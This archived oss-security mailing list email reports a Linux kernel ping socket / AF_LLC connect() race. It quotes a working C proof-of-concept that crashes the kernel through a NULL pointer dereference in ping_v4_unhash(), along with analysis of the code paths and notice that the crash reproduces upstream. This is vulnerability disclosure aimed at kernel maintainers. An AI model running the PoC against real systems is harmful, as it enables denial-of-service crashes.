X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2819" "Friday" "24" "March" "2017" "21:43:30" "+0100" "Andrey Konovalov" "andreyknvl@google.com" "<CAAeHK+yrE7+BZztHVn-2jKgLqgzgbBEa4VWCO8SL45oD0nRxEw@mail.gmail.com>" "79" "Re: [oss-security] Linux kernel ping socket / AF_LLC connect() sin_family race" nil nil nil "3" "2017032420:43:30" "[oss-security] Linux kernel ping socket / AF_LLC connect() sin_family race" (number mark "U       andreyknvl@g Mar 24   79/2819  " thread-indent "\"Re: [oss-security] Linux kernel ping socket / AF_LLC connect() sin_family race\"\n") "<20170324202714.GA29241@openwall.com>" ("<20170324202714.GA29241@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 16126 invoked by uid 550); 24 Mar 2017 20:45:30 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 15603 invoked from network); 24 Mar 2017 20:43:43 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
         :cc;
        bh=ThrulrF7dd7GrukasUGBQX0jAS2gDIWR7c/5c9yp1og=;
        b=EAWd2IlmicbcpuGMjGMrmbBNP3yDPE6ao4D4fNYt5BATyqPT2bNoA6HstZTBE5B3PG
         fD0Hb0KPZROf/RrcAfJry6x5J1R2MHC+uuVihDI3u8LAKVvKPCI9t0yn+aBzeNTtbYYe
         JFgBwp2Ea/dP5Hwl7ztsJlBf1lyqQ++s9rJenhyjZQ7w3o8J52EXT7y5Z5WtvYMhGqGQ
         V5B+vulrN7+GZf98HnwP/2j2Rj4hkPGIjA5I8x5hDHxKaO4S+HoPEX784TNl1hf8C0BT
         teeppuDpW654cknQliDinaOoSq4Jdv/O+esuNlnakoLzLIdXjH06V5FhO54x1S7le49m
         Fydw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to:cc;
        bh=ThrulrF7dd7GrukasUGBQX0jAS2gDIWR7c/5c9yp1og=;
        b=WoR0T2n+/Y9c5qaP0JN5eWcYbze4rscTUcYa8UrasqMvH0qU/RnBqY77vEOp8e8O/o
         qU+gO7pkZ2OIFluSc3tKm3ZTizY1nEt1s9Go0RH+HL1WtekZiYGy84R0kqWViFPyHb+9
         t+nH2ij7nAFKqGBWAzZYIwNLPtry9ZOcRJZKV/a8rg7idQZESPegvefwdfpIn58dYvyO
         1nCBEdmWvrlT9ZJQb1j6+P0/skK3Ql2dikRZBWK1rkxtqTlLDFVr4fU2aLwuoXUdncDM
         KSWoXTnPas1FZYs+nEk5d38npe41WQBN2UY0Sc7sY+TfjFB5HQz6hwIEKp75a7lWxvb5
         eWDQ==
X-Gm-Message-State: AFeK/H1vnHRmgG2EUmCnbLivLsxCSj/X2pbXoAAmqXZVy04WbWCVe+wgkb33c9X0DiOyJSl2sXJtbdgmJTpis/ue
X-Received: by 10.99.38.2 with SMTP id m2mr11146974pgm.169.1490388210536; Fri,
 24 Mar 2017 13:43:30 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <20170324202714.GA29241@openwall.com>
References: <20170324202714.GA29241@openwall.com>
From: Andrey Konovalov <andreyknvl@google.com>
Date: Fri, 24 Mar 2017 21:43:30 +0100
Message-ID: <CAAeHK+yrE7+BZztHVn-2jKgLqgzgbBEa4VWCO8SL45oD0nRxEw@mail.gmail.com>
To: oss-security@lists.openwall.com, "David S. Miller" <davem@davemloft.net>, 
	Alexey Kuznetsov <kuznet@ms2.inr.ac.ru>, James Morris <jmorris@namei.org>, 
	Hideaki YOSHIFUJI <yoshfuji@linux-ipv6.org>, Patrick McHardy <kaber@trash.net>, 
	netdev <netdev@vger.kernel.org>, LKML <linux-kernel@vger.kernel.org>, 
	Eric Dumazet <edumazet@google.com>
Cc: Vasily Kulikov <segoon@openwall.com>
Content-Type: text/plain; charset=UTF-8
Subject: Re: [oss-security] Linux kernel ping socket / AF_LLC connect()
 sin_family race

On Fri, Mar 24, 2017 at 9:27 PM, Solar Designer <solar@openwall.com> wrote:
> Hi,
>
> I haven't fully investigated this issue, and the Subject is provisional
> (but will probably get stuck).  I am not yet sure which kernel
> subsystem(s) to blame here (ping sockets? LLC sockets? other/more?), and
> there might be other ways to trigger the issue.

Reproduced the crash on current upstream
(ebe64824e9de4b3ab3bd3928312b4b2bc57b4b7e).

Adding kernel maintainers.

>
> Just off Twitter:
>
> https://twitter.com/danieljiang0415/status/845116665184497664
>
> daniel_jiang
> @danieljiang0415
> google won't fix kernel crash bug, I release the poc now.
> https://github.com/danieljiang0415/android_kernel_crash_poc
>
> And the PoC is:
>
> ---
> #include <stdio.h>
> #include <sys/socket.h>
> #include <arpa/inet.h>
> #include <stdlib.h>
> static int sockfd = 0;
> static struct sockaddr_in addr = {0};
>
> void fuzz(void * param){
>     while(1){
>         addr.sin_family = 0;//rand()%42;
>         printf("sin_family1 = %08lx\n", addr.sin_family);
>         connect(sockfd, (struct sockaddr *)&addr, 16);
>     }
> }
> int main(int argc, char **argv)
> {
>     sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
>     int thrd;
>     pthread_create(&thrd, NULL, fuzz, NULL);
>     while(1){
>         addr.sin_family = 0x1a;//rand()%42;
>         addr.sin_port = 0;
>         addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
>         connect(sockfd, (struct sockaddr *)&addr, 16);
>         addr.sin_family = 0;
>     }
>     return 0;
> }
> ---
>
> I suppose the focus on Android is because it makes ping sockets
> available to users by default, but the bug isn't Android-specific.
>
> By granting ping sockets to a user, I am able to crash a RHEL7'ish
> system with the above PoC quickly.  The crash (at least in my two tests)
> is a NULL pointer dereference in net/ipv4/ping.c: ping_v4_unhash().
> In newer upstream code, e.g. Linux 4.10.5, the function is renamed to
> ping_unhash() since it's shared with IPv6, but is otherwise similar.
>
> The two address families used by the PoC above are AF_UNSPEC and AF_LLC.
> For the latter, net/llc/af_llc.c: llc_ui_connect() checks for AF_LLC and
> then proceeds to overwrite parts of the "struct sockaddr".
> llc_ui_bind() looks similar, so the issue might also be triggerable via
> bind().  These overwrites might be directly related to the crash, or it
> might be something further.  At first glance, these two functions look
> similar in RHEL7 and 4.10.5, so, if relevant, can probably be used to
> trigger the issue on latest upstream as well.
>
> At this point, I think I'll leave further investigation to someone more
> up-to-date on these interfaces and conventions.  I am merely conveying
> the message, which at this point I understand only partially.
>
> Alexander
